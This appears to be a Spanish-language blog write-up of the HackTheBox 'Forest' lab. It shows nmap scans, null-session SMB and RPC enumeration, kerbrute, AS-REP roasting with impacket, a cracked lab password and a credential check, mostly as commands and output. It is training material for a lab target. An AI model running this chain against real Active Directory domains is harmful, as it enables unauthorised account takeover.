@@ -1,0 +1,942 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HTB forest AD - Bast1ant1c</title>
+<meta name="description" content="Vamos a resolver la máquina forest AD de HackTheBox. ¡Let’s hack!">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Bast1ant1c">
+<meta property="og:title" content="HTB forest AD">
+<meta property="og:url" content="http://localhost:4000/forest/">
+
+
+  <meta property="og:description" content="Vamos a resolver la máquina forest AD de HackTheBox. ¡Let’s hack!">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/forest/01-inicio.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-03-01T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/forest/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "Bast1ant1c",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Bast1ant1c Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Blog</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscar</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">HTB forest AD</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name"></h3>
+    
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HTB forest AD">
+    <meta itemprop="description" content="Vamos a resolver la máquina forest AD de HackTheBox. ¡Let’s hack!">
+    <meta itemprop="datePublished" content="March 01, 2023">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">HTB forest AD
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2023-03-01T00:00:00-05:00">March 01, 2023 </time>&emsp;
+          
+          
+        </p>
+        <p align="center">
+<img src="/assets/images/forest/02-tarjeta.png" />
+</p>
+
+<p>¡Hola!
+En esta ocasión vamos a resolver de la máquina <code class="language-plaintext highlighter-rouge">forest</code> AD de <a href="https://hackthebox.com/">HackTheBox</a>.
+La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!</p>
+
+<h2 id="preparación">PREPARACIÓN</h2>
+
+<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="language-plaintext highlighter-rouge">forest</code> y los subdirectorios <code class="language-plaintext highlighter-rouge">recon</code> junto con <code class="language-plaintext highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkhack forest
+<span class="nb">cd</span> <span class="o">!</span><span class="nv">$/</span>recon
+</code></pre></div></div>
+
+<h2 id="reconocimiento">RECONOCIMIENTO</h2>
+
+<p>Accedemos al directorio <code class="language-plaintext highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="language-plaintext highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>osping 10.10.10.161
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> Detectando sistema operativo ...
+
+<span class="o">[</span>+] 10.10.10.161 <span class="nv">ttl</span><span class="o">=</span>127 <span class="o">&gt;&gt;</span> Windows
+</code></pre></div></div>
+
+<p>Identificamos que es una maquina <strong>Windows</strong> debido a su ttl (time to live) correspondiente a 127 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).</p>
+
+<blockquote>
+
+  <ul>
+    <li>TTL =&gt; 64	Linux</li>
+    <li>TTL =&gt; 128	Windows</li>
+  </ul>
+
+</blockquote>
+
+<p>Continuamos con la enumeración de los <strong>65535</strong> puertos en la máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.161 <span class="nt">-oG</span> ports | <span class="nb">grep </span>open
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49671/tcp open  unknown
+49676/tcp open  unknown
+49677/tcp open  unknown
+49684/tcp open  unknown
+49703/tcp open  unknown
+</code></pre></div></div>
+
+<p>Luego de identificar los puertos abiertos <code class="language-plaintext highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49703 <span class="nt">-sCV</span> <span class="nt">-Pn</span> 10.10.10.161 <span class="nt">-oN</span> versions
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-02-03 20:13:26Z<span class="o">)</span>
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds <span class="o">(</span>workgroup: HTB<span class="o">)</span>
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49671/tcp open  msrpc        Microsoft Windows RPC
+49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc        Microsoft Windows RPC
+49684/tcp open  msrpc        Microsoft Windows RPC
+49703/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: FOREST<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</code></pre></div></div>
+
+<h2 id="ad-domain-detection">AD DOMAIN DETECTION</h2>
+
+<p>Iniciamos con la detección del <code class="language-plaintext highlighter-rouge">dominio</code> donde inicialmente, por medio de la utilidad <code class="language-plaintext highlighter-rouge">crackmapexec</code> enumeramos información necesaria para tener un mejor alcance a la máquina víctima.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.161
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.10.161    445    FOREST           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:FOREST<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Agregamos en el archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su
+nvim /etc/hosts
+10.10.10.161  FOREST FOREST.htb.local htb.local
+</code></pre></div></div>
+
+<h2 id="smb-null-session-enum">SMB NULL SESSION ENUM</h2>
+
+<p>Eumeramos información por smb null session</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.161 <span class="nt">--shares</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.10.161    445    FOREST           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:FOREST<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.161    445    FOREST           <span class="o">[</span>-] Error enumerating shares: SMB SessionError: 0x5b
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-L</span> 10.10.10.161 <span class="nt">-N</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Anonymous login successful
+
+	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+SMB1 disabled <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.10.161 <span class="nt">-u</span> <span class="s1">'null
+</span></code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[!]</span> Authentication error on 10.10.10.161
+</code></pre></div></div>
+
+<h2 id="rpcclient-null-session-enum">RPCCLIENT NULL SESSION ENUM</h2>
+
+<p>Eumeramos información por rpcclient null session</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s1">''</span> 10.10.10.161 <span class="nt">-N</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nv">$&gt;</span> enumdomusers
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+...
+</code></pre></div></div>
+<h3 id="generar-listado-de-usuarios">GENERAR LISTADO DE USUARIOS</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s1">''</span> 10.10.10.161 <span class="nt">-N</span> <span class="nt">-c</span> <span class="s1">'enumdomusers'</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\[.*?\]'</span> | <span class="nb">grep</span> <span class="nt">-v</span> 0x | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span> <span class="o">&gt;</span> users.txt
+</code></pre></div></div>
+<h3 id="enumeración-de-grupos">ENUMERACIÓN DE GRUPOS</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s1">''</span> 10.10.10.161 <span class="nt">-N</span> <span class="nt">-c</span> <span class="s1">'enumdomgroups'</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Admins] rid:[0x200]
+group:[Domain Users] rid:[0x201]
+...
+</code></pre></div></div>
+<h3 id="miembros-del-grupo-admin-0x200">MIEMBROS DEL GRUPO ADMIN (0X200)</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s1">''</span> 10.10.10.161 <span class="nt">-N</span> <span class="nt">-c</span> <span class="s1">'querygroupmem 0x200'</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	rid:[0x1f4] attr:[0x7]
+</code></pre></div></div>
+<h3 id="información-general-de-un-usuario">INFORMACIÓN GENERAL DE UN USUARIO</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s1">''</span> 10.10.10.161 <span class="nt">-N</span> <span class="nt">-c</span> <span class="s1">'queryuser 0x1f4'</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  User Name   :	Administrator
+	Full Name   :	Administrator
+	Home Drive  :	
+...
+</code></pre></div></div>
+<h3 id="descripciones-de-los-usuarios">DESCRIPCIONES DE LOS USUARIOS</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s1">''</span> 10.10.10.161 <span class="nt">-N</span> <span class="nt">-c</span> <span class="s1">'querydispinfo'</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>index: 0x2137 RID: 0x463 acb: 0x00020015 Account: <span class="nv">$331000</span><span class="nt">-VK4ADACQNUCA</span>	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: <span class="o">(</span>null<span class="o">)</span>
+index: 0xfbc RID: 0x1f4 acb: 0x00000010 Account: Administrator	Name: Administrator	Desc: Built-in account <span class="k">for </span>administering the computer/domain
+index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy	Name: Andy Hislip	Desc: <span class="o">(</span>null<span class="o">)</span>
+...
+</code></pre></div></div>
+
+<h1 id="tgt-kerbrute-enum">TGT KERBRUTE ENUM</h1>
+
+<p>Procedemos a validar nuestra lista de usuarios para identificar un nuevo usuario</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kerbrute userenum <span class="nt">-d</span> htb.local <span class="nt">--dc</span> 10.10.10.161 users.txt
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        
+
+Version: dev <span class="o">(</span>n/a<span class="o">)</span> - 01/24/23 - Ronnie Flathers @ropnop
+
+2023/02/03 15:25:54 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
+2023/02/03 15:25:54 <span class="o">&gt;</span>  	10.10.10.161:88
+
+2023/02/03 15:25:54 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Administrator@htb.local
+2023/02/03 15:25:54 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	HealthMailboxc3d7722@htb.local
+2023/02/03 15:25:54 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	HealthMailboxfc9daad@htb.local
+2023/02/03 15:25:54 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	HealthMailbox83d6781@htb.local
+2023/02/03 15:25:54 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	HealthMailboxc0a90c9@htb.local
+2023/02/03 15:25:54 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	HealthMailbox6ded678@htb.local
+2023/02/03 15:25:54 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	HealthMailbox670628e@htb.local
+2023/02/03 15:25:54 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	HealthMailboxfd87238@htb.local
+2023/02/03 15:25:54 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	HealthMailbox968e74d@htb.local
+2023/02/03 15:25:54 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	HealthMailbox7108a4e@htb.local
+2023/02/03 15:25:54 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	HealthMailboxb01ac64@htb.local
+2023/02/03 15:25:54 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	HealthMailbox0659cc1@htb.local
+2023/02/03 15:25:54 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	sebastien@htb.local
+2023/02/03 15:25:54 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	andy@htb.local
+2023/02/03 15:25:54 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	mark@htb.local
+2023/02/03 15:25:54 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	lucinda@htb.local
+2023/02/03 15:25:55 <span class="o">&gt;</span>  <span class="o">[</span>+] svc-alfresco has no pre auth required. Dumping <span class="nb">hash </span>to crack offline:
+<span class="nv">$krb5asrep$18$svc</span><span class="nt">-alfresco</span>@HTB.LOCAL:4ab11853a85eb99987b1cb0c8b02b4b5<span class="nv">$6766c3753d53ab1f010e65f06e57b1812f4e38b47a7264bf560164a9ba13ea7ff5fe864b6fbcc66b7e16395612d7434ed44f017fabdedb7cdbc92420be94f999d03aa60ab285f0aae069a3ce7f541f572792e298e754c4abbefaad7456f5457da4b59409a001b2b5d8c0b375110ad4912190e38bb74a88e7c8761a44ce201eb6f181d917c573e4b93e13813addaaf16840101af3b2d035dbc5fe6738d885534c819cd3f1fecd87c4e88d9daa2aae4a50fb29173f83941aec2956226e67b3ba297bbfa002869659e2eb3e965142423e1eca98d430b6c907cfccda4445a319979c54e9367803e5f56c8ec9918da05892dc6cbb98af9f230f274d91</span>
+2023/02/03 15:25:55 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	svc-alfresco@htb.local
+2023/02/03 15:25:55 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	santi@htb.local
+</code></pre></div></div>
+
+<h2 id="tgt-getnpusers-enum">TGT GETNPUSERS ENUM</h2>
+
+<p>Obtenemos que <code class="language-plaintext highlighter-rouge">svc-alfresco</code> es un usuario valido y capturamos su hash! Ahora vamos a realizar la misma validación con la herramienta <code class="language-plaintext highlighter-rouge">GetNPUsers</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetNPUsers htb.local/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+<span class="o">[</span>-] User Administrator doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User HealthMailboxc3d7722 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User HealthMailboxfc9daad doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailboxc0a90c9 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User HealthMailbox670628e doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox968e74d doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User HealthMailbox6ded678 doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox83d6781 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User HealthMailboxfd87238 doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailboxb01ac64 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User HealthMailbox7108a4e doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox0659cc1 doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User sebastien doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User lucinda doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="nv">$krb5asrep$23$svc</span><span class="nt">-alfresco</span>@HTB.LOCAL:3f219aedcfc2b1ca6fd9d077e8053643<span class="nv">$2545a94dc5c4e0fd926382edfedcc4723204ae41640a1cab55a1bd337c009e6cbd2314eaa675328b3ea79a7f21b2d96bb4d04e12d9e60b251a33718c33599212bea07c547efc20d4197d0bf2a289feb3b9334a31f5435fda74dcc98bf8436803268f4c9181c4840a79e401d2fae999dbc5921437486c5e1d2b33c192d216941d3f74555392f1cfe43d563532649480d5bc4b5775948c135285b632703f109dced7bb36b7f2e0951116fb4eb0d45c7a5dbeeb5518b3b9853881d89ae46c3d4996cf751a7c45b5648bcd528edf4b7647366ba2552e730fbc7b71f914e35206807ed6cf0a44e411</span>
+<span class="o">[</span>-] User andy doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User mark doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User santi doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+</span></code></pre></div></div>
+
+<h2 id="cracking-kerberos-hash">CRACKING KERBEROS HASH</h2>
+
+<p>Ahora que tenemos el hash capturado, vamos a almacenarlo en el archivo <code class="language-plaintext highlighter-rouge">hash</code> y crackearlo con <code class="language-plaintext highlighter-rouge">john</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'$krb5asrep$23$svc-alfresco@HTB.LOCAL:3f219aedcfc2b1ca6fd9d077e8053643$2545a94dc5c4e0fd926382edfedcc4723204ae41640a1cab55a1bd337c009e6cbd2314eaa675328b3ea79a7f21b2d96bb4d04e12d9e60b251a33718c33599212bea07c547efc20d4197d0bf2a289feb3b9334a31f5435fda74dcc98bf8436803268f4c9181c4840a79e401d2fae999dbc5921437486c5e1d2b33c192d216941d3f74555392f1cfe43d563532649480d5bc4b5775948c135285b632703f109dced7bb36b7f2e0951116fb4eb0d45c7a5dbeeb5518b3b9853881d89ae46c3d4996cf751a7c45b5648bcd528edf4b7647366ba2552e730fbc7b71f914e35206807ed6cf0a44e411'</span> <span class="o">&gt;</span> <span class="nb">hash</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>s3rvice          <span class="o">(</span><span class="nv">$krb5asrep$23$svc</span><span class="nt">-alfresco</span>@HTB.LOCAL<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="granted-access-svc-alfresco-user">GRANTED ACCESS SVC-ALFRESCO USER</h2>
+
+<p>Ahora tenemos lo necesario para conectarnos remotamente en caso de tener credenciales validas previamente detectadas por <code class="language-plaintext highlighter-rouge">crackmapexec</code> por medio de la utilidad <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.161 <span class="nt">-u</span> <span class="s1">'svc-alfresco'</span> <span class="nt">-p</span> <span class="s1">'s3rvice'</span>
+</code></pre></div></div>
